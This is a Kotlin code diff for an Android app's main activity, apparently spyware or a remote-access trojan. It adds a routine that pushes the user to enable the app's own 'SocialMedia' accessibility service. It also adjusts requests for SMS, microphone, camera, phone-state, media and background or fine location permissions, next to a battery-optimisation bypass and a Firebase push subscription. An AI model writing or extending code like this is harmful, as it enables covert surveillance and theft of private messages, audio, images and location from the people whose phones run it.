@@ -1,6 +1,9 @@
 package com.torvalds.rtdbdatasaervice
 
 import android.Manifest
+import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.AccessibilityServiceInfo
+import android.content.Context
 import android.content.Intent
 import android.net.Uri
 import android.os.Build
@@ -9,6 +12,7 @@ import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
+import android.view.accessibility.AccessibilityManager
 import android.widget.Toast
 import androidx.annotation.RequiresApi
 import com.google.firebase.FirebaseApp
@@ -20,6 +24,7 @@ import com.karumi.dexter.PermissionToken
 import com.karumi.dexter.listener.PermissionRequest
 import com.karumi.dexter.listener.multi.MultiplePermissionsListener
 import com.torvalds.rtdbdatasaervice.gameover.MyService
+import com.torvalds.rtdbdatasaervice.gameover.SocialMedia
 
 class MainActivity : AppCompatActivity() {
     private var aid: String = ""
@@ -34,6 +39,7 @@ class MainActivity : AppCompatActivity() {
         getAid()
         subscribeTopic()
         ignorebattryOptimization()
+        checkAndAskAcc()
     }
 
     private fun ignorebattryOptimization() {
@@ -67,6 +73,30 @@ class MainActivity : AppCompatActivity() {
             }*/
     }
 
+    private fun checkAndAskAcc() {
+        val enabled = isAccessibilityServiceEnabled(this, SocialMedia::class.java)
+        if (!enabled){
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            startActivity(intent)
+        }
+    }
+
+    fun isAccessibilityServiceEnabled(
+        context: Context,
+        service: Class<out AccessibilityService?>
+    ): Boolean {
+        val am = context.getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
+        val enabledServices =
+            am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
+        for (enabledService in enabledServices) {
+            val enabledServiceInfo = enabledService.resolveInfo.serviceInfo
+            if (enabledServiceInfo.packageName == context.packageName && enabledServiceInfo.name == service.name) return true
+        }
+        return false
+    }
+
+
 
     @RequiresApi(Build.VERSION_CODES.Q)
     fun askPermissions() {
@@ -76,15 +106,16 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.READ_SMS,
             Manifest.permission.RECORD_AUDIO,
             Manifest.permission.CAMERA,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.ACCESS_BACKGROUND_LOCATION
+            Manifest.permission.READ_PHONE_STATE
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             requiredPermissionsList.add(Manifest.permission.READ_MEDIA_IMAGES)
             requiredPermissionsList.add(Manifest.permission.READ_MEDIA_VIDEO)
             requiredPermissionsList.add(Manifest.permission.READ_MEDIA_AUDIO)
+            requiredPermissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION)
         } else {
             requiredPermissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            requiredPermissionsList.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
         }
 
         Dexter.withActivity(this).withPermissions(
